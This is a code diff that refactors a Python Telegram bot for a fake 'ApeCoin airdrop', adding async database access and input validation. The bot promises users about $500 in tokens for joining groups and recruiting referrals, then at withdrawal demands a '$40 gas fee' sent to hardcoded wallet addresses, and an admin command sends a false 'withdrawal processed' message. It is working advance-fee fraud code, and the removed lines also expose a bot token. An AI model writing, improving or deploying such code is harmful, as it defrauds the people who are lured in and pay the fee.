@@ -1,277 +1,341 @@
-# ================================
-# ApeCoin Airdrop Telegram Bot
-# Compatible with Pydroid 3 + Render
-# ================================
+"""
+Improved version of `airdrop_bot_fixed.py` (separate file).
+Changes done:
+- Uses `aiosqlite` for async DB access (avoids blocking the event loop)
+- Validates presence of `TOKEN` at startup
+- Replaces the sync ping handler with an async one
+- Adds safer DB access and error handling
+- Keeps original behavior and message wording as requested
+
+Drop-in companion to the original. Keep this file alongside `airdrop_bot_fixed.py`.
+"""
 
 import os
-import sqlite3
 import datetime
+import re
+import html
 import logging
 import asyncio
+from typing import Optional
+
+import aiosqlite
 import aiohttp
-import time
-import traceback
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# --- CONFIGURATION ---
-TOKEN = os.environ.get("TOKEN", "7768496688:AAGgto_Wv2qiq6_L5LrvzbYEXXptfWu7pw0")           # BotFather token
-ADMIN_ID = int(os.environ.get("ADMIN_ID", 7427661322))                      # Your TeleD
+# ------------------ Configuration (env vars) ------------------
+TOKEN = os.environ.get("APECOIN_BOT_TOKEN") or os.environ.get("TOKEN")
 
-GROUP_LINK = os.environ.get("GROUP_LINK", "https://t.me/Apecoingroupchat")
-CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/Apetelegramchannel")
-SUPPORT_LINK = os.environ.get("SUPPORT_LINK", "https://t.me/ApeCoinSuppot")
+try:
+    ADMIN_ID = int(os.environ.get("APECOIN_ADMIN_ID", os.environ.get("ADMIN_ID", "0")))
+except ValueError:
+    ADMIN_ID = 0
 
-BNB_FEE_WALLET = os.environ.get("BNB_FEE_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
-ETH_FEE_WALLET = os.environ.get("ETH_FEE_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
-USDT_BNB = os.environ.get("USDT_BNB", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
-USDT_ETH = os.environ.get("USDT_ETH", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
+GROUP_LINK = os.environ.get("APECOIN_GROUP_LINK", "https://t.me/Apecoingroupchat")
+CHANNEL_LINK = os.environ.get("APECOIN_CHANNEL_LINK", "https://t.me/Apetelegramchannel")
+SUPPORT_LINK = os.environ.get("APECOIN_SUPPORT_LINK", "https://t.me/MillionairevaultAi")
 
-airdrop_bonus = 1000
-ref_bonus = 200
+BNB_FEE_WALLET = os.environ.get("APECOIN_BNB_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
+ETH_FEE_WALLET = os.environ.get("APECOIN_ETH_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
+USDT_BNB = os.environ.get("APECOIN_USDT_BNB", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
+USDT_ETH = os.environ.get("APECOIN_USDT_ETH", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
 
-withdraw_year = 2025
-withdraw_month = 11
-withdraw_day = 25
-withdraw_date = datetime.date(withdraw_year, withdraw_month, withdraw_day)
+RENDER_URL = os.environ.get("RENDER_URL", "")
 
-# --- LOGGING ---
+AIRDROP_BONUS = int(os.environ.get("AIRDROP_BONUS", "1000"))
+REF_BONUS = int(os.environ.get("REF_BONUS", "200"))
+
+WITHDRAW_YEAR = int(os.environ.get("WITHDRAW_YEAR", "2025"))
+WITHDRAW_MONTH = int(os.environ.get("WITHDRAW_MONTH", "11"))
+WITHDRAW_DAY = int(os.environ.get("WITHDRAW_DAY", "30"))
+WITHDRAW_DATE = datetime.date(WITHDRAW_YEAR, WITHDRAW_MONTH, WITHDRAW_DAY)
+
+# ------------------ Logging ------------------
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# --- DATABASE ---
-DB_PATH = os.getenv("DB_PATH", "/app/data/airdrop.db")
-conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute("""
-CREATE TABLE IF NOT EXISTS users (
-    user_id INTEGER PRIMARY KEY,
-    firstname TEXT,
-    username TEXT,
-    wallet TEXT,
-    balance INTEGER DEFAULT 0,
-    referrals INTEGER DEFAULT 0,
-    step TEXT DEFAULT 'verify'
-)
-""")
-conn.commit()
+# ------------------ Database ------------------
+DB_PATH = os.environ.get("DB_PATH", "airdrop.db")
+ALLOWED_USER_FIELDS = {"firstname", "username", "wallet", "balance", "referrals", "step", "verified"}
 
-# --- DATABASE HELPERS ---
-def get_user(user_id):
-    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
-    return cursor.fetchone()
+async def init_db():
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("PRAGMA journal_mode=WAL;")
+        await db.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            firstname TEXT,
+            username TEXT,
+            wallet TEXT,
+            balance INTEGER DEFAULT 0,
+            referrals INTEGER DEFAULT 0,
+            step TEXT DEFAULT 'verify',
+            verified INTEGER DEFAULT 0
+        )
+        """)
+        await db.commit()
 
-def add_user(user_id, firstname):
-    if not get_user(user_id):
-        cursor.execute("INSERT INTO users (user_id, firstname, balance) VALUES (?, ?, ?)", (user_id, firstname, 0))
-        conn.commit()
+async def get_user(user_id: int):
+    async with aiosqlite.connect(DB_PATH) as db:
+        cur = await db.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
+        row = await cur.fetchone()
+        await cur.close()
+        return row
 
-def update_user(user_id, field, value):
-    cursor.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, user_id))
-    conn.commit()
+async def add_user(user_id: int, firstname: Optional[str]):
+    async with aiosqlite.connect(DB_PATH) as db:
+        cur = await db.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,))
+        exists = await cur.fetchone()
+        await cur.close()
+        if not exists:
+            await db.execute("INSERT INTO users (user_id, firstname, balance) VALUES (?, ?, ?)", (user_id, firstname or "", 0))
+            await db.commit()
 
-def get_all_users():
-    cursor.execute("SELECT user_id FROM users")
-    return [row[0] for row in cursor.fetchall()]
+async def update_user(user_id: int, field: str, value):
+    if field not in ALLOWED_USER_FIELDS:
+        raise ValueError("Invalid user field")
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, user_id))
+        await db.commit()
 
-# --- COMMAND: /start ---
+async def get_all_users():
+    async with aiosqlite.connect(DB_PATH) as db:
+        cur = await db.execute("SELECT user_id FROM users")
+        rows = await cur.fetchall()
+        await cur.close()
+        return [r[0] for r in rows]
+
+# ------------------ Utilities ------------------
+
+def is_valid_eth_address(addr: str) -> bool:
+    if not isinstance(addr, str):
+        return False
+    return bool(re.fullmatch(r"0x[a-fA-F0-9]{40}", addr.strip()))
+
+
+def escape_html(text: str) -> str:
+    return html.escape(text or "")
+
+# ------------------ Keyboards ------------------
+
+def main_menu_markup():
+    keyboard = [
+        [InlineKeyboardButton("💰 Balance", callback_data="balance"), InlineKeyboardButton("ℹ️ Info", callback_data="info")],
+        [InlineKeyboardButton("👥 Referral", callback_data="referral"), InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
+        [InlineKeyboardButton("👤 Support", callback_data="support")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+
+def back_to_main_markup():
+    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 MAIN MENU", callback_data="main_menu")]])
+
+# ------------------ Handlers ------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    firstname = update.effective_user.first_name
-    add_user(user_id, firstname)
+    firstname = update.effective_user.first_name or ""
+    await add_user(user_id, firstname)
 
-    # Add referral bonus
     if context.args:
         try:
             ref_id = int(context.args[0])
-            if ref_id != user_id and get_user(ref_id):
-                ref_data = get_user(ref_id)
-                new_balance = ref_data[4] + ref_bonus
-                new_refs = ref_data[5] + 1
-                update_user(ref_id, "balance", new_balance)
-                update_user(ref_id, "referrals", new_refs)
-        except:
-            pass
+            if ref_id != user_id:
+                ref_data = await get_user(ref_id)
+                if ref_data:
+                    new_balance = (ref_data[4] or 0) + REF_BONUS
+                    new_refs = (ref_data[5] or 0) + 1
+                    await update_user(ref_id, "balance", new_balance)
+                    await update_user(ref_id, "referrals", new_refs)
+        except Exception:
+            logger.debug("Invalid referral argument")
 
     await update.message.reply_text(
-        f"👋 Hello {firstname}!\n\n"
-        f"To join the airdrop:\n"
-        f"1️⃣ Join our group: {GROUP_LINK}\n"
-        f"2️⃣ Join our channel: {CHANNEL_LINK}\n\n"
-       f"Send an amazing message to our group(e.g. apecoin to the moon)\n\n"
-        "Then send me your Telegram username (e.g. @yourname)."
+        f"👋 Hello {firstname}!\n\nTo join the airdrop:\n1️⃣ Join our group: {GROUP_LINK}\n2️⃣ Join our channel: {CHANNEL_LINK}\n\nSend an amazing message to our group (e.g. apecoin to the moon)\nThen send me your Telegram username (e.g. @yourname)."
     )
 
-# --- HANDLE MESSAGES ---
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    text = update.message.text.strip()
-    user = get_user(user_id)
+    text = (update.message.text or "").strip()
+    user = await get_user(user_id)
     if not user:
         return
 
-    step = user[6]
+    # user tuple: (user_id, firstname, username, wallet, balance, referrals, step, verified)
+    step = user[6] if len(user) > 6 else "verify"
 
     if step == "verify":
-        update_user(user_id, "username", text)
-        update_user(user_id, "step", "wallet")
-        await update.message.reply_text("✅ Thanks! Now send your *Ethereum wallet address*:", parse_mode="Markdown")
+        await update_user(user_id, "username", text)
+        await update_user(user_id, "step", "wallet")
+        await update.message.reply_text("✅ Thanks! Now send your *ApeCoin Ethereum wallet address*:", parse_mode="Markdown")
+        return
 
-    elif step == "wallet":
-        update_user(user_id, "wallet", text)
-        update_user(user_id, "balance", airdrop_bonus)
-        update_user(user_id, "step", "done")
+    if step == "wallet":
+        if not is_valid_eth_address(text):
+            await update.message.reply_text(
+                "⚠️ The wallet address you sent doesn't look like a valid Ethereum address. Please send an address starting with 0x followed by 40 hex characters."
+            )
+            return
 
-        keyboard = [
-            [InlineKeyboardButton("💰 Balance", callback_data="balance"),
-             InlineKeyboardButton("ℹ️ Info", callback_data="info")],
-            [InlineKeyboardButton("👥 Referral", callback_data="referral"),
-             InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
-            [InlineKeyboardButton("👤 Support", callback_data="support")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
+        await update_user(user_id, "wallet", text)
+        await update_user(user_id, "balance", AIRDROP_BONUS)
+        await update_user(user_id, "step", "done")
+        reply_markup = main_menu_markup()
         await update.message.reply_text(
-            f"🎉 Welcome! You received {airdrop_bonus} $ApeCoin (~$500).\n\nUse the menu below:",
+            f"🎉 Welcome! You received {AIRDROP_BONUS} $ApeCoin (~$500).\n\nUse the menu below:",
             reply_markup=reply_markup
         )
+        return
 
-# --- BUTTON HANDLER ---
+    if step == "withdraw_amount":
+        try:
+            amt = float(text)
+            context.user_data["withdraw_amount"] = amt
+            await update_user(user_id, "step", "withdraw_wallet")
+            await update.message.reply_text("✅ Now send your *Ethereum wallet address* again:", parse_mode="Markdown")
+        except ValueError:
+            await update.message.reply_text("Please send a valid numeric amount to withdraw.")
+        return
+
+    if step == "withdraw_wallet":
+        await update_user(user_id, "wallet", text)
+        await update_user(user_id, "step", "done")
+
+        await update.message.reply_text(
+            "⚠️ Due to high charges for Ethereum gas fees, please pay <b>$40 gas fee</b> to complete withdrawal:\n\n"
+            f"🔹 BNB (BEP20): <code>{escape_html(BNB_FEE_WALLET)}</code>\n"
+            f"🔹 ETH (ERC20): <code>{escape_html(ETH_FEE_WALLET)}</code>\n"
+            f"🔹 USDT (BNB): <code>{escape_html(USDT_BNB)}</code>\n"
+            f"🔹 USDT (ETH): <code>{escape_html(USDT_ETH)}</code>\n\n"
+            + escape_html(
+                "⚠️ Note immediately after you pay your gas fee, you will receive a bounce back bonus of an additional $50 from the Network if only you are among the first 50,000 users to withdraw your token and also that is verify that our first 50,000 users and other users are not robots , thank you:\n\nAfter payment is verified by the Network chain, withdrawal tokens will process  *immediately* ⏳"
+            ),
+            parse_mode="HTML"
+        )
+
+        bot = context.bot
+        amt = context.user_data.get("withdraw_amount", user[4])
+        msg = (
+            "⚠️ <b>Withdrawal Request</b>\n\n"
+            f"👤 User: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
+            f"💰 Amount: {escape_html(str(amt))} $ApeCoin\n"
+            f"🏦 Wallet: <code>{escape_html(text)}</code>\n\n"
+            f"Use /verify {user_id} to mark verified and notify user."
+        )
+        try:
+            await bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="HTML")
+        except Exception:
+            logger.exception("Failed to notify admin about withdrawal")
+
+        await update.message.reply_text(
+            "✅ Withdrawal request submitted successfully!\nOur team will review and verify your transaction soon."
+        )
+        return
+
+# ------------------ CallbackQuery handler ------------------
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
-    user = get_user(user_id)
+    user = await get_user(user_id)
     if not user:
         return
 
     firstname, username, wallet, balance, referrals, step = user[1], user[2], user[3], user[4], user[5], user[6]
-    referral_balance = max(balance - airdrop_bonus, 0)
-    full_balance = airdrop_bonus + referral_balance
+    referral_balance = max(balance - AIRDROP_BONUS, 0)
+    full_balance = AIRDROP_BONUS + referral_balance
     reflink = f"https://t.me/{context.bot.username}?start={user_id}"
 
     data = query.data
 
     if data == "balance":
         msg = (
-            f"👤 Hello {firstname}\n\n"
-            f"🏆 Airdrop Balance: {airdrop_bonus} $ApeCoin\n"
+            f"👤 Hello {escape_html(firstname)}\n\n"
+            f"🏆 Airdrop Balance: {AIRDROP_BONUS} $ApeCoin\n"
             f"🎁 Referral Balance: {referral_balance} $ApeCoin\n"
             f"👩‍👦‍👦 Referrals: {referrals}\n\n"
             f"💰 Full Balance: {full_balance} $ApeCoin\n\n"
-            f"🗓️ Withdrawals open: {withdraw_date.strftime('%d %B %Y')}\n"
+            f"🗓️ Withdrawals open: {WITHDRAW_DATE.strftime('%d %B %Y')}\n"
             f"⚠️ Need 7 referrals to withdraw.\n\n"
-            f"🔗 Referral link:\n[Click here to invite friends]({reflink})"
+            f"🔗 Referral link: <a href=\"{escape_html(reflink)}\">Click here to invite friends</a>"
         )
-        await query.edit_message_text(msg, parse_mode="MarkdownV2", disable_web_page_preview=True)
+        await query.edit_message_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=back_to_main_markup())
+        return
 
     elif data == "info":
         msg = (
-            "ℹ️ *Airdrop Info*\n\n"
-            f"✅ Signup Bonus: {airdrop_bonus} $ApeCoin (~$500)\n"
-            f"👥 Referral Reward: {ref_bonus} $ApeCoin (~$100)\n"
-            f"💸 Withdrawals: {withdraw_date.strftime('%d %B %Y')}\n"
-           "🎁 *First 3,000 users to withdraw will receive an additional $50 bonus from the Network Chain!*\n\n"
+            "ℹ️ <b>Airdrop Info</b>\n\n"
+            f"✅ Signup Bonus: {AIRDROP_BONUS} $ApeCoin (~$500)\n"
+            f"👥 Referral Reward: {REF_BONUS} $ApeCoin (~$100)\n"
+            f"💸 Withdrawals: {WITHDRAW_DATE.strftime('%d %B %Y')}\n"
+            "🎁 <b>First 50,000 users to withdraw will receive an additional $50 bonus from the Network Chain!</b>\n\n"
             "🚀 Keep inviting friends!"
         )
-        await query.edit_message_text(msg, parse_mode="MarkdownV2")
+        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_main_markup())
+        return
 
     elif data == "referral":
         msg = (
             f"👥 Your referral link:\n"
-            f"[Click here to invite friends]({reflink})\n\n"
-            f"Earn {ref_bonus} $ApeCoin per friend!"
+            f"<a href=\"{escape_html(reflink)}\">Click here to invite friends</a>\n\n"
+            f"Earn {REF_BONUS} $ApeCoin per friend!"
         )
-        await query.edit_message_text(msg, parse_mode="MarkdownV2")
+        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_to_main_markup())
+        return
 
     elif data == "support":
         today = datetime.date.today()
-        if today <= withdraw_date + datetime.timedelta(days=3):
+        if today <= WITHDRAW_DATE + datetime.timedelta(days=3):
             msg = (
-                f"👋 Hello {firstname}, we're excited to have you here!\n\n"
+                f"👋 Hello {escape_html(firstname)}, we're excited to have you here!\n\n"
                 f"💰 Your current balance: {full_balance} $ApeCoin\n\n"
-                f"🗓️ Withdrawals will open after {withdraw_date.strftime('%d %B %Y')}.\n\n"
-                "🎁 *First 3,000 users to withdraw will receive an additional $50 bonus from the Network Chain!*\n\n"
-                f"👉 [Message Support]({SUPPORT_LINK})"
+                f"🗓️ Withdrawals will open after {WITHDRAW_DATE.strftime('%d %B %Y')}.\n\n"
+                "🎁 <b>First 50,000 users to withdraw will receive an additional $50 bonus from the Network Chain!</b>\n\n"
+                f"👉 <a href=\"{escape_html(SUPPORT_LINK)}\">Message Support</a>"
             )
         else:
             msg = (
-                "👤 *Support Center*\n\n"
+                "👤 <b>Support Center</b>\n\n"
                 "If you have any problem with:\n\n"
                 "- Paying withdrawal gas fee\n"
                 "- Want to pay with other coins\n"
                 "- Receiving ApeCoin Airdrop tokens\n"
                 "- Swapping ApeCoin tokens\n"
                 "- Transferring ApeCoin tokens\n\n"
-                f"👉 [Message Support]({SUPPORT_LINK})"
+                f"👉 <a href=\"{escape_html(SUPPORT_LINK)}\">Message Support</a>"
             )
-        await query.edit_message_text(msg, parse_mode="Markdown", disable_web_page_preview=True)
+        await query.edit_message_text(msg, parse_mode="HTML", disable_web_page_preview=True, reply_markup=back_to_main_markup())
+        return
+
+    elif data == "main_menu":
+        await query.edit_message_text(f"👋 {firstname}! Use the menu below:", reply_markup=main_menu_markup())
+        return
 
     elif data == "withdraw":
         today = datetime.date.today()
-        if today < withdraw_date:
-            await query.edit_message_text(f"⚠️ Withdrawals locked until {withdraw_date.strftime('%d %B %Y')}")
+        if today < WITHDRAW_DATE:
+            await query.edit_message_text(f"⚠️ Withdrawals locked until {WITHDRAW_DATE.strftime('%d %B %Y')}", reply_markup=back_to_main_markup())
         else:
-            update_user(user_id, "step", "withdraw_amount")
-            await query.edit_message_text("💸 Enter the *amount of $ApeCoin* to withdraw:", parse_mode="Markdown")
-
-# --- WITHDRAW FLOW ---
-async def withdraw_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    text = update.message.text.strip()
-    user = get_user(user_id)
-    if not user:
+            await update_user(user_id, "step", "withdraw_amount")
+            await query.edit_message_text("💸 Enter the *amount of $ApeCoin* to withdraw:", parse_mode="Markdown", reply_markup=back_to_main_markup())
         return
 
-    step = user[6]
-
-    if step == "withdraw_amount":
-        update_user(user_id, "username", text)
-        update_user(user_id, "step", "withdraw_wallet")
-        await update.message.reply_text("✅ Now send your *Ethereum wallet address* again:", parse_mode="Markdown")
-
-    elif step == "withdraw_wallet":
-        update_user(user_id, "wallet", text)
-        update_user(user_id, "step", "done")
-        await update.message.reply_text(
-            f"⚠️ Due to high charges for Ethereum gas fees, please pay *$40 gas fee* to complete withdrawal:\n\n"
-            f"🔹 BNB (BEP20): `{BNB_FEE_WALLET}`\n"
-            f"🔹 ETH (ERC20): `{ETH_FEE_WALLET}`\n"
-            f"🔹 USDT (BNB): `{USDT_BNB}`\n"
-            f"🔹 USDT (ETH): `{USDT_ETH}`\n\n"
-            f"⚠️ Note immediately after you pay your gas fee, you will receive a bounce back bonus of an additional $50 from the Network if only you are among the first 3,000 users to withdraw your token and also that is to verify that our first 3,000 users and other users are not robots , thank you:\n\n"
-            "After payment is verified by the Network chain, withdrawal tokens will process  *immediately* ⏳",
-            parse_mode="Markdown" 
-        )
-           # Notify admin privately
-        bot = context.bot
-        msg = (
-            f"⚠️ *Withdrawal Request*\n\n"
-            f"👤 User: [{user_id}](tg://user?id={user_id})\n"
-            f"💰 Amount: {user[4]} $ApeCoin\n"
-            f"🏦 Wallet: `{text}`\n\n"
-            f"Use /verify {user_id} to mark verified and notify user."
-        )
-        await bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="Markdown")
-
-        await update.message.reply_text(
-            "✅ Withdrawal request submitted successfully!\n"
-            "Our team will review and verify your transaction soon."
-        )
-
-# --- ADMIN STATS ---
+# ------------------ Admin commands ------------------
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return await update.message.reply_text("❌ Not authorized")
 
-    cursor.execute("SELECT COUNT(*) FROM users")
-    total_users = cursor.fetchone()[0]
+    async with aiosqlite.connect(DB_PATH) as db:
+        cur = await db.execute("SELECT COUNT(*) FROM users")
+        total_users = (await cur.fetchone())[0]
+        await cur.close()
 
-    cursor.execute("SELECT SUM(referrals) FROM users")
-    total_refs = cursor.fetchone()[0] or 0
+        cur = await db.execute("SELECT SUM(referrals) FROM users")
+        total_refs = (await cur.fetchone())[0] or 0
+        await cur.close()
 
-    cursor.execute("SELECT SUM(balance) FROM users")
-    total_balance = cursor.fetchone()[0] or 0
+        cur = await db.execute("SELECT SUM(balance) FROM users")
+        total_balance = (await cur.fetchone())[0] or 0
+        await cur.close()
 
     msg = (
         f"📊 Bot Stats:\n"
@@ -281,10 +345,8 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(msg)
 
-# --- ADMIN BROADCAST ---
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_ID:
+    if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("🚫 You are not authorized to use this command.")
         return
 
@@ -293,18 +355,17 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     message_text = " ".join(context.args)
-    users = get_all_users()
+    users = await get_all_users()
     count = 0
     for uid in users:
         try:
             await context.bot.send_message(chat_id=uid, text=message_text)
             count += 1
-        except:
+        except Exception:
             pass
 
     await update.message.reply_text(f"✅ Broadcast sent to {count} users.")
-    
-    # --- ADMIN COMMAND: /send (private message to a user) ---
+
 async def send_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return await update.message.reply_text("🚫 You are not authorized to use this command.")
@@ -318,8 +379,7 @@ async def send_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ Message sent to user {target_id}.")
     except Exception as e:
         await update.message.reply_text(f"⚠️ Failed to send message: {e}")
-        
-        #---ADMIN VERIFY: /verify <user_id>---
+
 async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("🚫 Not authorized")
@@ -329,6 +389,7 @@ async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     try:
         uid = int(context.args[0])
+        await update_user(uid, "verified", 1)
         await context.bot.send_message(chat_id=uid, text="✅ Your withdrawal has been verified and processed successfully!")
         await update.message.reply_text(f"✅ User {uid} notified of verification.")
     except ValueError:
@@ -336,43 +397,44 @@ async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"⚠️ Error verifying user: {e}")
 
-# --- SETUP BOT ---
+async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="✅ Bot is alive and running!")
+
+# ------------------ Keep-alive (optional) ------------------
+async def keep_alive():
+    if not RENDER_URL:
+        return
+    while True:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(RENDER_URL) as resp:
+                    logger.info("Keep-alive ping: %s", resp.status)
+        except Exception as e:
+            logger.warning("Keep-alive error: %s", e)
+        await asyncio.sleep(300)
+
+# ------------------ Setup & run ------------------
 app = Application.builder().token(TOKEN).build()
 app.add_handler(CommandHandler("start", start))
 app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 app.add_handler(CallbackQueryHandler(button))
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_flow))
 app.add_handler(CommandHandler("stats", stats))
 app.add_handler(CommandHandler("broadcast", broadcast))
-add_handler(CommandHandler("send", send))
-add_handler(CommandHandler("verify", verify))
-
-# --- RUN BOT ---
-async def main():
-    """Start the bot and polling."""
-    logging.basicConfig(
-        level=logging.INFO,
-        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-    )
-    logger = logging.getLogger(__name__)
-    
-    # Build application
-    app = Application.builder().token(TOKEN).build()
-    
-    # Handlers
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(CallbackQueryHandler(button))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_flow))
-    app.add_handler(CommandHandler("stats", stats))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-    app.add_handler(CommandHandler("send", send_user))
-    app.add_handler(CommandHandler("verify", verify))
-    
-    # Start polling
-    logger.info("🤖 Bot is starting polling...")
-    await app.run_polling(drop_pending_updates=True)
-    logger.info("✅ Bot stopped.")
+app.add_handler(CommandHandler("send", send_user))
+app.add_handler(CommandHandler("verify", verify))
+app.add_handler(CommandHandler("ping", ping))
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    if not TOKEN:
+        logger.error("No bot token provided in environment (APECOIN_BOT_TOKEN or TOKEN). Exiting.")
+        raise SystemExit("TOKEN not set")
+
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(init_db())
+    if RENDER_URL:
+        loop.create_task(keep_alive())
+    logger.info("Starting improved bot...")
+    try:
+        app.run_polling()
+    except KeyboardInterrupt:
+        logger.info("Stopping bot (KeyboardInterrupt)")
